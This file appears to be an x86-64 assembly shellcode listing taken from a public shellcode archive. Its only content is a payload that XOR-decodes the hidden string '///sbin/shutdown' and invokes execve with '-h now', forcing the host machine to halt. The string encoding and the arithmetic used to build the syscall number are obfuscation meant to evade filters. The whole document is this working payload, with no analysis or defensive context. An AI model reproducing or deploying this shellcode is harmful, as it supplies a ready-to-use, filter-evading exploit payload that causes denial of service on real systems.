;;; http://shell-storm.org/shellcode/files/shellcode-892.php
 
section .text
global _start
 
_start:
 
	xor rax, rax                ; clear rax and rdx
	cdq

	;; -h to stack
	push rax
	push word 0x682d ;-h
	push rsp
	pop rcx
	 
	;; now to stack
	push rax
	push byte 0x77
	push word 0x6f6e ; now
	
	push rsp
	pop rbx 
	push rax
	push rbx
	push rcx
	 
	;; /sbin/shutdown to stack
	push rsp
	pop rsi
	push rax
	jmp shutdown

cont:
	pop rdi
	push 16
	pop rcx
	mov r8b, 0xc8
decode:
	xor byte [rdi+rcx-1], r8b	
	loop decode
	; push 59
	push 0x3
	pop rax
	add al, 56
	syscall
	 
shutdown:
	call cont
	; c_1: db 0x2f,0x2e,0x2e,0x72,0x61,0x68,0x6d,0x2e,0x72,0x67,0x74,0x73,0x63,0x6e,0x76,0x6d ; orig

	; c_1: db 0x2f,0x2f,0x2f,0x73,0x62,0x69,0x6e,0x2f,0x73,0x68,0x75,0x74,0x64,0x6f,0x77,0x6e ; cleartext ///sbin/shutdown
	c_1: db 0xe7,0xe7,0xe7,0xbb,0xaa,0xa1,0xa6,0xe7,0xbb,0xa0,0xbd,0xbc,0xac,0xa7,0xbf,0xa6 ; encoded




